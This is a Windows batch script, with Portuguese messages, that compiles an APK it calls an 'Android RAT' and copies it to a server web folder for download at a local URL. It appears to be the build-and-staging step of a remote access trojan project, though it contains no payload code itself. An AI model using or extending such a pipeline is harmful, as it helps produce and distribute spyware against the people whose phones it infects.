@echo off
echo ====================================
echo   Build APK - Android RAT
echo ====================================
echo.

cd /d "%~dp0"

echo [1/3] Limpando build anterior...
call gradlew clean

echo.
echo [2/3] Compilando APK...
call gradlew assembleDebug

echo.
echo [3/3] Copiando APK para servidor...
if exist "app\build\outputs\apk\debug\app-debug.apk" (
    copy /Y "app\build\outputs\apk\debug\app-debug.apk" "..\server\web\rat-app.apk"
    echo.
    echo ====================================
    echo   BUILD CONCLUIDO!
    echo ====================================
    echo.
    echo APK gerado em:
    echo   - app\build\outputs\apk\debug\app-debug.apk
    echo   - server\web\rat-app.apk
    echo.
    echo Tamanho: 
    for %%A in ("..\server\web\rat-app.apk") do echo   %%~zA bytes
    echo.
    echo Download disponivel em:
    echo   http://localhost:7771/web/rat-app.apk
    echo.
) else (
    echo.
    echo ====================================
    echo   ERRO NO BUILD!
    echo ====================================
    echo.
    echo Verifique os erros acima.
    pause
    exit /b 1
)

pause
